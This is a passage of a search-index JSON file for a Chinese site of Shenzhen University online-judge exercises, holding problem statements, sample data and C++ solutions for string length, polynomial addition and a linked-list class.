) { std :: vector < Pair >:: iterator it = std :: find ( vector . begin (), vector . end (), string ); if ( it != vector . end ()) { it -> count += 1 ; } else { vector . push_back ( Pair ( string , 1 )); } std :: cin >> string ; } std :: sort ( vector . begin (), vector . end ()); for ( int i = 0 ; i < vector . size (); ++ i ) { std :: cout << vector [ i ]. count << ' ' << vector [ i ]. string << std :: endl ; } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/cpp/1341/","text":"\u8ba1\u7b97\u5b57\u7b26\u4e32\u7684\u957f\u5ea6 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u8ba1\u7b97\u5b57\u7b26\u4e32S\u7684\u957f\u5ea6\uff0c\u529f\u80fd\u4e0estrlen\u51fd\u6570\u76f8\u540c\uff0c\u4f46\u4e0d\u80fd\u8c03\u7528\u5e93\u51fd\u6570strlen\uff0c\u5426\u5219\u4e0d\u7ed9\u5206\u3002\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u4e0d\u5305\u542b\u7a7a\u683c\u3002 \u8f93\u5165 \u8f93\u5165\u6d4b\u8bd5\u7ec4\u6570t \u5bf9\u4e8e\u6bcf\u7ec4\u6d4b\u8bd5\uff0c\u8f93\u5165\u5b57\u7b26\u4e32S\uff08\u957f\u5ea6<=30\uff09 \u8f93\u51fa \u5bf9\u4e8e\u6bcf\u7ec4\u6d4b\u8bd5\uff0c\u8f93\u51faS\u7684\u957f\u5ea6 \u6837\u4f8b\u8f93\u5165 1 2 1 hehe \u6837\u4f8b\u8f93\u51fa 1 4 \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include <iostream> int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { char str [ 64 ] = {}; std :: cin >> str ; int length = 0 ; while ( str [ ++ length ] != '\\0' ); std :: cout << length << std :: endl ; } return 0 ; }","title":"\u8ba1\u7b97\u5b57\u7b26\u4e32\u7684\u957f\u5ea6"},{"location":"szu_oj/cpp/1341/#_1","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"\u8ba1\u7b97\u5b57\u7b26\u4e32\u7684\u957f\u5ea6"},{"location":"szu_oj/cpp/1341/#_2","text":"\u8ba1\u7b97\u5b57\u7b26\u4e32S\u7684\u957f\u5ea6\uff0c\u529f\u80fd\u4e0estrlen\u51fd\u6570\u76f8\u540c\uff0c\u4f46\u4e0d\u80fd\u8c03\u7528\u5e93\u51fd\u6570strlen\uff0c\u5426\u5219\u4e0d\u7ed9\u5206\u3002\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u4e0d\u5305\u542b\u7a7a\u683c\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/cpp/1341/#_3","text":"\u8f93\u5165\u6d4b\u8bd5\u7ec4\u6570t \u5bf9\u4e8e\u6bcf\u7ec4\u6d4b\u8bd5\uff0c\u8f93\u5165\u5b57\u7b26\u4e32S\uff08\u957f\u5ea6<=30\uff09","title":"\u8f93\u5165"},{"location":"szu_oj/cpp/1341/#_4","text":"\u5bf9\u4e8e\u6bcf\u7ec4\u6d4b\u8bd5\uff0c\u8f93\u51faS\u7684\u957f\u5ea6","title":"\u8f93\u51fa"},{"location":"szu_oj/cpp/1341/#_5","text":"1 2 1 hehe","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/cpp/1341/#_6","text":"1 4","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/cpp/1341/#_7","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/cpp/1341/#_8","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include <iostream> int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { char str [ 64 ] = {}; std :: cin >> str ; int length = 0 ; while ( str [ ++ length ] != '\\0' ); std :: cout << length << std :: endl ; } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1024-19/","text":"DS\u7ebf\u6027\u8868\u2014\u591a\u9879\u5f0f\u76f8\u52a0 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u5bf9\u4e8e\u4e00\u5143\u591a\u9879\u5f0f p(x) = p_{0} + p_{1}x + p_{2}x^{2} + \u2026 + p_{n}x^{n} p(x) = p_{0} + p_{1}x + p_{2}x^{2} + \u2026 + p_{n}x^{n} \uff0c\u6bcf\u4e2a\u9879\u90fd\u6709\u7cfb\u6570\u548c\u6307\u6570\u4e24\u90e8\u5206\uff0c\u4f8b\u5982 p_{2}x^{2} p_{2}x^{2} \u7684\u7cfb\u6570\u4e3a p_{2} p_{2} ,\u6307\u6570\u4e3a 2 2 \u3002 \u7f16\u7a0b\u5b9e\u73b0\u4e24\u4e2a\u591a\u9879\u5f0f\u7684\u76f8\u52a0\u3002 \u4f8b\u5982 5 + x + 2x^{2} + 3x^{3} 5 + x + 2x^{2} + 3x^{3} \uff0c -5 - x + 6x^{2} + 4x^{4} -5 - x + 6x^{2} + 4x^{4} \uff0c\u4e24\u8005\u76f8\u52a0\u7ed3\u679c\uff1a 8x^{2} + 3x^{3} + 4x^{4} 8x^{2} + 3x^{3} + 4x^{4} \u5176\u4e2d\u7cfb\u65705\u548c-5\u90fd\u662fx\u76840\u6b21\u65b9\u7684\u7cfb\u6570\uff0c\u76f8\u52a0\u540e\u4e3a0\uff0c\u6240\u4ee5\u4e0d\u663e\u793a\u3002x\u76841\u6b21\u65b9\u540c\u7406\u4e0d\u663e\u793a\u3002 \u53ef\u7528\u987a\u5e8f\u8868\u6216\u5355\u94fe\u8868\u5b9e\u73b0\u3002 \u8f93\u5165 \u7b2c1\u884c\uff1a\u8f93\u5165t\u8868\u793a\u6709t\u7ec4\u6d4b\u8bd5\u6570\u636e \u7b2c2\u884c\uff1a\u8f93\u5165n\u8868\u793a\u6709\u7b2c1\u7ec4\u7684\u7b2c1\u4e2a\u591a\u9879\u5f0f\u5305\u542bn\u4e2a\u9879 \u7b2c3\u884c\uff1a\u8f93\u5165\u7b2c\u4e00\u9879\u7684\u7cfb\u6570\u548c\u6307\u6570\uff0c\u4ee5\u6b64\u7c7b\u63a8\u8f93\u5165n\u884c \u63a5\u7740\u8f93\u5165m\u8868\u793a\u7b2c1\u7ec4\u7684\u7b2c2\u4e2a\u591a\u9879\u5f0f\u5305\u542bm\u9879 \u540c\u7406\u8f93\u5165\u7b2c2\u4e2a\u591a\u9879\u5f0f\u7684m\u4e2a\u9879\u7684\u7cfb\u6570\u548c\u6307\u6570 \u53c2\u8003\u4e0a\u9762\u8f93\u5165\u7b2c2\u7ec4\u6570\u636e\uff0c\u4ee5\u6b64\u7c7b\u63a8\u8f93\u5165t\u7ec4 \u5047\u8bbe\u6240\u6709\u6570\u636e\u90fd\u662f\u6574\u6570 \u8f93\u51fa \u5bf9\u4e8e\u6bcf1\u7ec4\u6570\u636e\uff0c\u5148\u7528\u4e24\u884c\u8f93\u51fa\u4e24\u4e2a\u539f\u6765\u7684\u591a\u9879\u5f0f\uff0c\u518d\u7528\u4e00\u884c\u8f93\u51fa\u8fd0\u7b97\u7ed3\u679c\uff0c\u4e0d\u5fc5\u8003\u8651\u7ed3\u679c\u5168\u4e3a0\u7684\u60c5\u51b5 \u8f93\u51fa\u683c\u5f0f\u53c2\u8003\u6837\u672c\u6570\u636e\uff0c\u683c\u5f0f\u8981\u6c42\u5305\u62ec\uff1a 1.\u5982\u679c\u6307\u6570\u6216\u7cfb\u6570\u662f\u8d1f\u6570\uff0c\u7528\u5c0f\u62ec\u53f7\u62ec\u8d77\u6765\u3002 2.\u5982\u679c\u7cfb\u6570\u4e3a0\uff0c\u5219\u8be5\u9879\u4e0d\u7528\u8f93\u51fa\u3002 3.\u5982\u679c\u6307\u6570\u4e0d\u4e3a0\uff0c\u5219\u7528\u7b26\u53f7^\u8868\u793a\uff0c\u4f8b\u5982x\u76843\u6b21\u65b9\uff0c\u8868\u793a\u4e3ax^3\u3002 4.\u591a\u9879\u5f0f\u7684\u6bcf\u4e2a\u9879\u4e4b\u95f4\u7528\u7b26\u53f7+\u8fde\u63a5\uff0c\u6bcf\u4e2a+\u4e24\u8fb9\u52a01\u4e2a\u7a7a\u683c\u9694\u5f00\u3002 \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 2 4 5 0 1 1 2 2 3 3 4 - 5 0 - 1 1 6 2 4 4 3 - 3 0 - 5 1 2 2 4 9 - 1 2 0 3 1 - 2 2 \u6837\u4f8b\u8f93\u51fa 1 2 3 4 5 6 5 + 1 x ^ 1 + 2 x ^ 2 + 3 x ^ 3 ( - 5 ) + ( - 1 ) x ^ 1 + 6 x ^ 2 + 4 x ^ 4 8 x ^ 2 + 3 x ^ 3 + 4 x ^ 4 ( - 3 ) + ( - 5 ) x ^ 1 + 2 x ^ 2 9 x ^ ( - 1 ) + 2 + 3 x ^ 1 + ( - 2 ) x ^ 2 9 x ^ ( - 1 ) + ( - 1 ) + ( - 2 ) x ^ 1 \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 #include <iostream> #include <vector> #include <algorithm> class Poly { public : struct Node { int coefficient , exponent ; Node () = default ; Node ( int coefficient , int exponent ) : coefficient ( coefficient ), exponent ( exponent ) {} Node operator + ( const Node & rhs ) { return { this -> coefficient + rhs . coefficient , this -> exponent }; } bool operator < ( const Node & rhs ) const { return this -> exponent < rhs . exponent ; } friend std :: ostream & operator << ( std :: ostream & os , const Node & rhs ) { if ( rhs . coefficient < 0 ) { os << '(' << rhs . coefficient << ')' ; } else { os << rhs . coefficient ; } if ( rhs . exponent == 0 ) { return os ; } os << \"x^\" ; if ( rhs . exponent < 0 ) { return os << '(' << rhs . exponent << ')' ; } else { return os << rhs . exponent ; } } }; explicit Poly ( int size ) : poly ( size ) {} explicit Poly ( std :: vector < Node > & poly ) : poly ( poly ) {} void setFromCin () { for ( auto & item : this -> poly ) { std :: cin >> item . coefficient >> item . exponent ; } } Poly operator + ( const Poly & rhs ) { std :: vector < Node > polyToReturn ; size_t i1 = 0 , i2 = 0 ; while ( true ) { const Node & node1 = this -> poly [ i1 ], & node2 = rhs . poly [ i2 ]; if ( i1 == this -> poly . size () && i2 == rhs . poly . size ()) { break ; } if ( i1 == this -> poly . size ()) { polyToReturn . emplace_back ( node2 ); i2 += 1 ; continue ; } if ( i2 == rhs . poly . size ()) { polyToReturn . emplace_back ( node1 ); i1 += 1 ; continue ; } if ( node1 . exponent < node2 . exponent ) { polyToReturn . emplace_back ( node1 ); i1 += 1 ; } else if ( node1 . exponent == node2 . exponent ) { polyToReturn . emplace_back ( Node ( node1 . coefficient + node2 . coefficient , node1 . exponent )); i1 += 1 ; i2 += 1 ; } else { polyToReturn . emplace_back ( node2 ); i2 += 1 ; } } polyToReturn . erase ( std :: remove_if ( polyToReturn . begin (), polyToReturn . end (), []( Node & node ) { return node . coefficient == 0 ; }), polyToReturn . end ()); return Poly ( polyToReturn ); } friend std :: ostream & operator << ( std :: ostream & os , const Poly & rhs ) { auto & polyToPrint = rhs . poly ; os << polyToPrint . front (); for ( size_t i = 1 ; i < polyToPrint . size (); ++ i ) { os << \" + \" << polyToPrint [ i ]; } return os ; } private : std :: vector < Node > poly ; }; int main () { int T ; std :: cin >> T ; while ( T -- ) { int size ; std :: cin >> size ; Poly lhs ( size ); lhs . setFromCin (); std :: cout << lhs << std :: endl ; std :: cin >> size ; Poly rhs ( size ); rhs . setFromCin (); std :: cout << rhs << std :: endl ; std :: cout << lhs + rhs << std :: endl ; } return 0 ; }","title":"DS\u7ebf\u6027\u8868\u2014\u591a\u9879\u5f0f\u76f8\u52a0"},{"location":"szu_oj/ds/1024-19/#ds","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u7ebf\u6027\u8868\u2014\u591a\u9879\u5f0f\u76f8\u52a0"},{"location":"szu_oj/ds/1024-19/#_1","text":"\u5bf9\u4e8e\u4e00\u5143\u591a\u9879\u5f0f p(x) = p_{0} + p_{1}x + p_{2}x^{2} + \u2026 + p_{n}x^{n} p(x) = p_{0} + p_{1}x + p_{2}x^{2} + \u2026 + p_{n}x^{n} \uff0c\u6bcf\u4e2a\u9879\u90fd\u6709\u7cfb\u6570\u548c\u6307\u6570\u4e24\u90e8\u5206\uff0c\u4f8b\u5982 p_{2}x^{2} p_{2}x^{2} \u7684\u7cfb\u6570\u4e3a p_{2} p_{2} ,\u6307\u6570\u4e3a 2 2 \u3002 \u7f16\u7a0b\u5b9e\u73b0\u4e24\u4e2a\u591a\u9879\u5f0f\u7684\u76f8\u52a0\u3002 \u4f8b\u5982 5 + x + 2x^{2} + 3x^{3} 5 + x + 2x^{2} + 3x^{3} \uff0c -5 - x + 6x^{2} + 4x^{4} -5 - x + 6x^{2} + 4x^{4} \uff0c\u4e24\u8005\u76f8\u52a0\u7ed3\u679c\uff1a 8x^{2} + 3x^{3} + 4x^{4} 8x^{2} + 3x^{3} + 4x^{4} \u5176\u4e2d\u7cfb\u65705\u548c-5\u90fd\u662fx\u76840\u6b21\u65b9\u7684\u7cfb\u6570\uff0c\u76f8\u52a0\u540e\u4e3a0\uff0c\u6240\u4ee5\u4e0d\u663e\u793a\u3002x\u76841\u6b21\u65b9\u540c\u7406\u4e0d\u663e\u793a\u3002 \u53ef\u7528\u987a\u5e8f\u8868\u6216\u5355\u94fe\u8868\u5b9e\u73b0\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1024-19/#_2","text":"\u7b2c1\u884c\uff1a\u8f93\u5165t\u8868\u793a\u6709t\u7ec4\u6d4b\u8bd5\u6570\u636e \u7b2c2\u884c\uff1a\u8f93\u5165n\u8868\u793a\u6709\u7b2c1\u7ec4\u7684\u7b2c1\u4e2a\u591a\u9879\u5f0f\u5305\u542bn\u4e2a\u9879 \u7b2c3\u884c\uff1a\u8f93\u5165\u7b2c\u4e00\u9879\u7684\u7cfb\u6570\u548c\u6307\u6570\uff0c\u4ee5\u6b64\u7c7b\u63a8\u8f93\u5165n\u884c \u63a5\u7740\u8f93\u5165m\u8868\u793a\u7b2c1\u7ec4\u7684\u7b2c2\u4e2a\u591a\u9879\u5f0f\u5305\u542bm\u9879 \u540c\u7406\u8f93\u5165\u7b2c2\u4e2a\u591a\u9879\u5f0f\u7684m\u4e2a\u9879\u7684\u7cfb\u6570\u548c\u6307\u6570 \u53c2\u8003\u4e0a\u9762\u8f93\u5165\u7b2c2\u7ec4\u6570\u636e\uff0c\u4ee5\u6b64\u7c7b\u63a8\u8f93\u5165t\u7ec4 \u5047\u8bbe\u6240\u6709\u6570\u636e\u90fd\u662f\u6574\u6570","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1024-19/#_3","text":"\u5bf9\u4e8e\u6bcf1\u7ec4\u6570\u636e\uff0c\u5148\u7528\u4e24\u884c\u8f93\u51fa\u4e24\u4e2a\u539f\u6765\u7684\u591a\u9879\u5f0f\uff0c\u518d\u7528\u4e00\u884c\u8f93\u51fa\u8fd0\u7b97\u7ed3\u679c\uff0c\u4e0d\u5fc5\u8003\u8651\u7ed3\u679c\u5168\u4e3a0\u7684\u60c5\u51b5 \u8f93\u51fa\u683c\u5f0f\u53c2\u8003\u6837\u672c\u6570\u636e\uff0c\u683c\u5f0f\u8981\u6c42\u5305\u62ec\uff1a 1.\u5982\u679c\u6307\u6570\u6216\u7cfb\u6570\u662f\u8d1f\u6570\uff0c\u7528\u5c0f\u62ec\u53f7\u62ec\u8d77\u6765\u3002 2.\u5982\u679c\u7cfb\u6570\u4e3a0\uff0c\u5219\u8be5\u9879\u4e0d\u7528\u8f93\u51fa\u3002 3.\u5982\u679c\u6307\u6570\u4e0d\u4e3a0\uff0c\u5219\u7528\u7b26\u53f7^\u8868\u793a\uff0c\u4f8b\u5982x\u76843\u6b21\u65b9\uff0c\u8868\u793a\u4e3ax^3\u3002 4.\u591a\u9879\u5f0f\u7684\u6bcf\u4e2a\u9879\u4e4b\u95f4\u7528\u7b26\u53f7+\u8fde\u63a5\uff0c\u6bcf\u4e2a+\u4e24\u8fb9\u52a01\u4e2a\u7a7a\u683c\u9694\u5f00\u3002","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1024-19/#_4","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 2 4 5 0 1 1 2 2 3 3 4 - 5 0 - 1 1 6 2 4 4 3 - 3 0 - 5 1 2 2 4 9 - 1 2 0 3 1 - 2 2","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1024-19/#_5","text":"1 2 3 4 5 6 5 + 1 x ^ 1 + 2 x ^ 2 + 3 x ^ 3 ( - 5 ) + ( - 1 ) x ^ 1 + 6 x ^ 2 + 4 x ^ 4 8 x ^ 2 + 3 x ^ 3 + 4 x ^ 4 ( - 3 ) + ( - 5 ) x ^ 1 + 2 x ^ 2 9 x ^ ( - 1 ) + 2 + 3 x ^ 1 + ( - 2 ) x ^ 2 9 x ^ ( - 1 ) + ( - 1 ) + ( - 2 ) x ^ 1","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1024-19/#_6","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1024-19/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 #include <iostream> #include <vector> #include <algorithm> class Poly { public : struct Node { int coefficient , exponent ; Node () = default ; Node ( int coefficient , int exponent ) : coefficient ( coefficient ), exponent ( exponent ) {} Node operator + ( const Node & rhs ) { return { this -> coefficient + rhs . coefficient , this -> exponent }; } bool operator < ( const Node & rhs ) const { return this -> exponent < rhs . exponent ; } friend std :: ostream & operator << ( std :: ostream & os , const Node & rhs ) { if ( rhs . coefficient < 0 ) { os << '(' << rhs . coefficient << ')' ; } else { os << rhs . coefficient ; } if ( rhs . exponent == 0 ) { return os ; } os << \"x^\" ; if ( rhs . exponent < 0 ) { return os << '(' << rhs . exponent << ')' ; } else { return os << rhs . exponent ; } } }; explicit Poly ( int size ) : poly ( size ) {} explicit Poly ( std :: vector < Node > & poly ) : poly ( poly ) {} void setFromCin () { for ( auto & item : this -> poly ) { std :: cin >> item . coefficient >> item . exponent ; } } Poly operator + ( const Poly & rhs ) { std :: vector < Node > polyToReturn ; size_t i1 = 0 , i2 = 0 ; while ( true ) { const Node & node1 = this -> poly [ i1 ], & node2 = rhs . poly [ i2 ]; if ( i1 == this -> poly . size () && i2 == rhs . poly . size ()) { break ; } if ( i1 == this -> poly . size ()) { polyToReturn . emplace_back ( node2 ); i2 += 1 ; continue ; } if ( i2 == rhs . poly . size ()) { polyToReturn . emplace_back ( node1 ); i1 += 1 ; continue ; } if ( node1 . exponent < node2 . exponent ) { polyToReturn . emplace_back ( node1 ); i1 += 1 ; } else if ( node1 . exponent == node2 . exponent ) { polyToReturn . emplace_back ( Node ( node1 . coefficient + node2 . coefficient , node1 . exponent )); i1 += 1 ; i2 += 1 ; } else { polyToReturn . emplace_back ( node2 ); i2 += 1 ; } } polyToReturn . erase ( std :: remove_if ( polyToReturn . begin (), polyToReturn . end (), []( Node & node ) { return node . coefficient == 0 ; }), polyToReturn . end ()); return Poly ( polyToReturn ); } friend std :: ostream & operator << ( std :: ostream & os , const Poly & rhs ) { auto & polyToPrint = rhs . poly ; os << polyToPrint . front (); for ( size_t i = 1 ; i < polyToPrint . size (); ++ i ) { os << \" + \" << polyToPrint [ i ]; } return os ; } private : std :: vector < Node > poly ; }; int main () { int T ; std :: cin >> T ; while ( T -- ) { int size ; std :: cin >> size ; Poly lhs ( size ); lhs . setFromCin (); std :: cout << lhs << std :: endl ; std :: cin >> size ; Poly rhs ( size ); rhs . setFromCin (); std :: cout << rhs << std :: endl ; std :: cout << lhs + rhs << std :: endl ; } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1199/","text":"DS\u5355\u94fe\u8868--\u7c7b\u5b9e\u73b0 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u7528C++\u8bed\u8a00\u548c\u7c7b\u5b9e\u73b0\u5355\u94fe\u8868\uff0c\u542b\u5934\u7ed3\u70b9 \u5c5e\u6027\u5305\u62ec\uff1adata\u6570\u636e\u57df\u3001next\u6307\u9488\u57df \u64cd\u4f5c\u5305\u62ec\uff1a\u63d2\u5165\u3001\u5220\u9664\u3001\u67e5\u627e \u6ce8\u610f\uff1a\u5355\u94fe\u8868\u4e0d\u662f\u6570\u7ec4\uff0c\u6240\u4ee5\u4f4d\u7f6e\u4ece1\u5f00\u59cb\u5bf9\u5e94\u9996\u7ed3\u70b9\uff0c\u5934\u7ed3\u70b9\u4e0d\u653e\u6570\u636e \u7c7b\u5b9a\u4e49\u53c2\u8003 \u8f93\u5165 \u7b2c1\u884c\u5148\u8f93\u5165n\u8868\u793a\u6709n\u4e2a\u6570\u636e\uff0c\u63a5\u7740\u8f93\u5165n\u4e2a\u6570\u636e \u7b2c2\u884c\u8f93\u5165\u8981\u63d2\u5165\u7684\u4f4d\u7f6e\u548c\u65b0\u6570\u636e \u7b2c3\u884c\u8f93\u5165\u8981\u63d2\u5165\u7684\u4f4d\u7f6e\u548c\u65b0\u6570\u636e \u7b2c4\u884c\u8f93\u5165\u8981\u5220\u9664\u7684\u4f4d\u7f6e \u7b2c5\u884c\u8f93\u5165\u8981\u5220\u9664\u7684\u4f4d\u7f6e \u7b2c6\u884c\u8f93\u5165\u8981\u67e5\u627e\u7684\u4f4d\u7f6e \u7b2c7\u884c\u8f93\u5165\u8981\u67e5\u627e\u7684\u4f4d\u7f6e \u8f93\u51fa \u6570\u636e\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00\uff0c \u7b2c1\u884c\u8f93\u51fa\u521b\u5efa\u540e\u7684\u5355\u94fe\u8868\u7684\u6570\u636e \u6bcf\u6210\u529f\u6267\u884c\u4e00\u6b21\u64cd\u4f5c\uff08\u63d2\u5165\u6216\u5220\u9664\uff09\uff0c\u8f93\u51fa\u6267\u884c\u540e\u7684\u5355\u94fe\u8868\u6570\u636e \u6bcf\u6210\u529f\u6267\u884c\u4e00\u6b21\u67e5\u627e\uff0c\u8f93\u51fa\u67e5\u627e\u5230\u7684\u6570\u636e \u5982\u679c\u6267\u884c\u64cd\u4f5c\u5931\u8d25\uff08\u5305\u62ec\u63d2\u5165\u3001\u5220\u9664\u3001\u67e5\u627e\u7b49\u5931\u8d25\uff09\uff0c\u8f93\u51fa\u5b57\u7b26\u4e32error\uff0c\u4e0d\u5fc5\u8f93\u51fa\u5355\u94fe\u8868 \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 6 7 6 11 22 33 44 55 66 3 777 1 888 1 11 0 5 \u6837\u4f8b\u8f93\u51fa 1 2 3 4 5 6 7 11 22 33 44 55 66 11 22 777 33 44 55 66 888 11 22 777 33 44 55 66 11 22 777 33 44 55 66 error error 44 \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 #include <iostream> #include <vector> #include <stdexcept> class List { public : List ( std :: vector < int > & vector ) : root_ ( new Node ) { Node * node = root_ ; for ( int i = 0 ; i < vector . size (); ++ i , node = node -> next ) { node -> next = new Node ( vector [ i ]); } } ~ List () { Node * node = root_ , * next ; while ( node != NULL ) { next = node -> next ; delete node ; node = next ; } } int at ( int index ) { int count = 0 ; Node * node = root_ ; while ( node -> next != NULL ) { count += 1 ; node = node -> next ; if ( count == index ) { return node -> data ; } } throw std :: out_of_range ( \"UPPER_LIMIT\" ); } void insert ( int index , int data ) { int count = 0 ; Node * node = root_ ; while ( node -> next != NULL || ( count + 1 ) == index ) { count += 1 ; if ( count == index ) { Node * tmp = node -> next ; node -> next = new Node ( data , tmp ); return ; } node = node -> next ; } throw std :: out_of_range ( \"UPPER_LIMIT\" ); } void erase ( int index ) { int count = 0 ; Node * node = root_ ; while ( node -> next != NULL ) { count += 1 ; if ( count == index ) { Node * tmp = node -> next ; node -> next = node -> next -> next ; delete tmp ; return ; } node = node -> next ; } throw std :: out_of_range ( \"UPPER_LIMIT\" ); } int length () { int count = 0 ; Node * node = root_ ; while ( node -> next != NULL ) { node = node -> next ; count += 1 ; } return count ; } void print () { Node * node = root_ ; while ( node -> next != NULL ) { node = node -> next ; std :: cout << node -> data << ' ' ; } std :: cout << std :: endl ; } private : struct Node { int data ; Node * next ; Node () : data ( 0 ), next ( NULL ) {} Node ( int data ) : data ( data ) {} Node ( int data , Node * next ) : data ( data ), next ( next ) {} }; Node * root_ ; }; int main () { int size ; std :: cin >> size ; std :: vector < int > vector ( static_cast < size_t > ( size )); for ( int i = 0 ; i < size ; ++ i ) { std :: cin >> vector [ i ]; } List list ( vector ); list . print (); for ( int i = 0 ; i < 2 ; ++ i ) { int index , number ; std :: cin >> index >> number ; try { list . insert ( index , number ); list . print (); } catch ( std :: out_of_range & out_of_range ) { std :: cout << \"error\" << std :: endl ; } } for ( int i = 0 ; i < 2 ; ++ i ) { int index ; std :: cin >> index ; try { list . erase ( index ); list . print (); } catch ( std :: out_of_range & out_of_range ) { std :: cout << \"error\" << std :: endl ; } } for ( int i = 0 ; i < 2 ; ++ i ) { int index ; std :: cin >> index ; try { std :: cout << list . at ( index ) << std :: endl ; } catch ( std :: out_of_range & out_of_range ) { std :: cout << \"error\" << std :: endl ; } } return 0 ; }","title":"DS\u5355\u94fe\u8868--\u7c7b\u5b9e\u73b0"},{"location":"szu_oj/ds/1199/#ds-","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u5355\u94fe\u8868--\u7c7b\u5b9e\u73b0"},{"location":"szu_oj/ds/1199/#_1","text":"\u7528C++\u8bed\u8a00\u548c\u7c7b\u5b9e\u73b0\u5355\u94fe\u8868\uff0c\u542b\u5934\u7ed3\u70b9 \u5c5e\u6027\u5305\u62ec\uff1adata\u6570\u636e\u57df\u3001next\u6307\u9488\u57df \u64cd\u4f5c\u5305\u62ec\uff1a\u63d2\u5165\u3001\u5220\u9664\u3001\u67e5\u627e \u6ce8\u610f\uff1a\u5355\u94fe\u8868\u4e0d\u662f\u6570\u7ec4\uff0c\u6240\u4ee5\u4f4d\u7f6e\u4ece1\u5f00\u59cb\u5bf9\u5e94\u9996\u7ed3\u70b9\uff0c\u5934\u7ed3\u70b9\u4e0d\u653e\u6570\u636e \u7c7b\u5b9a\u4e49\u53c2\u8003","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1199/#_2","text":"\u7b2c1\u884c\u5148\u8f93\u5165n\u8868\u793a\u6709n\u4e2a\u6570\u636e\uff0c\u63a5\u7740\u8f93\u5165n\u4e2a\u6570\u636e \u7b2c2\u884c\u8f93\u5165\u8981\u63d2\u5165\u7684\u4f4d\u7f6e\u548c\u65b0\u6570\u636e \u7b2c3\u884c\u8f93\u5165\u8981\u63d2\u5165\u7684\u4f4d\u7f6e\u548c\u65b0\u6570\u636e \u7b2c4\u884c\u8f93\u5165\u8981\u5220\u9664\u7684\u4f4d\u7f6e \u7b2c5\u884c\u8f93\u5165\u8981\u5220\u9664\u7684\u4f4d\u7f6e \u7b2c6\u884c\u8f93\u5165\u8981\u67e5\u627e\u7684\u4f4d\u7f6e \u7b2c7\u884c\u8f93\u5165\u8981\u67e5\u627e\u7684\u4f4d\u7f6e","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1199/#_3","text":"\u6570\u636e\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00\uff0c \u7b2c1\u884c\u8f93\u51fa\u521b\u5efa\u540e\u7684\u5355\u94fe\u8868\u7684\u6570\u636e \u6bcf\u6210\u529f\u6267\u884c\u4e00\u6b21\u64cd\u4f5c\uff08\u63d2\u5165\u6216\u5220\u9664\uff09\uff0c\u8f93\u51fa\u6267\u884c\u540e\u7684\u5355\u94fe\u8868\u6570\u636e \u6bcf\u6210\u529f\u6267\u884c\u4e00\u6b21\u67e5\u627e\uff0c\u8f93\u51fa\u67e5\u627e\u5230\u7684\u6570\u636e 